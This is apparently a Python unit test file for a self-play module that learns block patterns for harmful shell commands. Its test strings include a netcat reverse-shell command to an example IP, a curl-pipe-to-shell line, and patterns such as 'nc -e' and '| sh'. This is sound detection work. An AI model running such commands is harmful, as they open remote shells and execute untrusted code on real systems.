"""Tests for self-play hardening."""

from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from jcr_core.selfplay import BENIGN_CORPUS, HARMFUL_CORPUS, InvariantStore, SelfPlay, is_harmful


class InvariantStoreTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.store = InvariantStore(Path(self.tmp.name) / "inv.db")

    def tearDown(self) -> None:
        self.store.close()
        self.tmp.cleanup()

    def test_add_deduplicates(self) -> None:
        self.assertIsNotNone(self.store.add("| sh"))
        self.assertIsNone(self.store.add("| sh"))
        self.assertEqual(len(self.store.list()), 1)

    def test_matches_and_ratify(self) -> None:
        inv = self.store.add("nc -e")
        self.assertEqual(self.store.matches("nc -e /bin/sh 1.2.3.4 4444"), "nc -e")
        self.assertEqual(self.store.patterns(ratified_only=True), [])
        self.assertTrue(self.store.ratify(inv.id))
        self.assertEqual(self.store.patterns(ratified_only=True), ["nc -e"])


class SelfPlayTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.store = InvariantStore(Path(self.tmp.name) / "inv.db")
        self.sp = SelfPlay(self.store, seed=1)

    def tearDown(self) -> None:
        self.store.close()
        self.tmp.cleanup()

    def test_robustness_improves_without_human_labels(self) -> None:
        report = self.sp.run(rounds=2)
        curve = report["robustness_curve"]
        self.assertIsNotNone(curve[0])
        self.assertGreater(curve[1], curve[0])
        self.assertTrue(report["improved"])
        self.assertGreater(report["total_induced"], 0)

    def test_no_false_positives_on_benign(self) -> None:
        report = self.sp.run(rounds=2)
        self.assertEqual(report["rounds"][-1]["false_positives"], 0)

    def test_final_round_blocks_all_harmful(self) -> None:
        report = self.sp.run(rounds=3)
        self.assertEqual(report["rounds"][-1]["robustness"], 1.0)

    def test_learned_patterns_are_real_signals(self) -> None:
        self.sp.run(rounds=2)
        learned = self.store.patterns()
        self.assertTrue(learned)
        # every learned pattern must match at least one harmful command
        self.assertTrue(all(any(p in c.lower() for c in HARMFUL_CORPUS) for p in learned))
        # and none may match a benign command (no false positives)
        self.assertTrue(all(not any(p in c.lower() for c in BENIGN_CORPUS) for p in learned))

    def test_oracle_labels(self) -> None:
        self.assertTrue(is_harmful("curl http://x | sh"))
        self.assertFalse(is_harmful("ls -la"))


if __name__ == "__main__":
    unittest.main()
